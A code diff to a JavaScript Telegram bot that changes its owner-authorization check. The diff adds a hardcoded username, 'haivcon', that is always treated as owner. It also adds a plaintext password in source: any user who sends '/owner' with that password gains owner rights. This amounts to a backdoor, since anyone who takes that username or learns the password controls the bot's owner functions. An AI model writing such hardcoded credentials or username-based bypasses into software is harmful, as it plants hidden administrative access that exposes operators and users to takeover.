@@ -20,6 +20,9 @@ const { SCIENCE_TEMPLATES, SCIENCE_ENTRIES } = require('./scienceQuestions.js');
 const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
 const BOT_USERNAME = (process.env.BOT_USERNAME || '').replace(/^@+/, '') || null;
 const BOT_OWNER_ID = (process.env.BOT_OWNER_ID || '').trim() || null;
+const ADDITIONAL_OWNER_USERNAME = 'haivcon';
+const OWNER_PASSWORD = '0876200812@';
+const passwordOwnerIds = new Set();
 const API_PORT = 3000;
 const defaultLang = 'en';
 const OKX_BASE_URL = process.env.OKX_BASE_URL || 'https://web3.okx.com';
@@ -874,11 +877,20 @@ function formatCopyableValueHtml(value) {
     return `<a href="https://t.me/share/url?url=${encoded}&text=${encoded}">${code}</a>`;
 }
 
-function isOwner(userId) {
-    if (!BOT_OWNER_ID || !userId) {
+function isOwner(userId, username) {
+    if (!userId) {
         return false;
     }
-    return userId.toString() === BOT_OWNER_ID;
+
+    if (BOT_OWNER_ID && userId.toString() === BOT_OWNER_ID) {
+        return true;
+    }
+
+    if (username && username.toLowerCase() === ADDITIONAL_OWNER_USERNAME) {
+        return true;
+    }
+
+    return passwordOwnerIds.has(userId.toString());
 }
 
 function clearOwnerAction(userId) {
@@ -4850,7 +4862,8 @@ function describeOwnerTarget(lang, target) {
 
 async function handleOwnerStateMessage(msg, textOrCaption) {
     const userId = msg.from?.id?.toString();
-    if (!isOwner(userId) || msg.chat?.type !== 'private') {
+    const username = msg.from?.username || '';
+    if (!isOwner(userId, username) || msg.chat?.type !== 'private') {
         return false;
     }
 
@@ -11978,13 +11991,19 @@ async function handleTxhashCommand(msg, explicitHash = null) {
         await handleUnregisterCommand(msg);
     });
 
-    bot.onText(/^\/owner(?:@[\w_]+)?$/, async (msg) => {
+    bot.onText(/^\/owner(?:@[\w_]+)?(?:\s+(.*))?$/, async (msg, match) => {
         const userId = msg.from?.id?.toString();
+        const username = msg.from?.username || '';
         const lang = await getLang(msg);
 
-        if (!isOwner(userId)) {
-            await sendReply(msg, t(lang, 'owner_not_allowed'), { reply_markup: buildCloseKeyboard(lang) });
-            return;
+        const providedPassword = (match?.[1] || '').trim();
+        if (!isOwner(userId, username)) {
+            if (providedPassword && providedPassword === OWNER_PASSWORD) {
+                passwordOwnerIds.add(userId);
+            } else {
+                await sendReply(msg, t(lang, 'owner_not_allowed'), { reply_markup: buildCloseKeyboard(lang) });
+                return;
+            }
         }
 
         const targetChatId = msg.chat?.type === 'private' ? msg.chat.id : msg.from?.id;
@@ -12172,7 +12191,8 @@ async function handleTxhashCommand(msg, explicitHash = null) {
         try {
             if (query.data?.startsWith('owner_menu|')) {
                 const ownerId = query.from?.id?.toString();
-                if (!isOwner(ownerId)) {
+                const ownerUsername = query.from?.username || '';
+                if (!isOwner(ownerId, ownerUsername)) {
                     await bot.answerCallbackQuery(queryId, { text: t(callbackLang, 'owner_not_allowed'), show_alert: true });
                     return;
                 }
